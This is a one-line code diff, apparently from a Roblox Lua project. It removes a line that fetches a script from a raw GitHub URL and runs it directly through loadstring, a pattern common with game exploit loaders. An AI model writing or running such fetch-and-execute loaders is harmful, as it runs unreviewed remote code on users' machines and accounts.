@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/hellamane/epixcryan/main/source.lua"))()
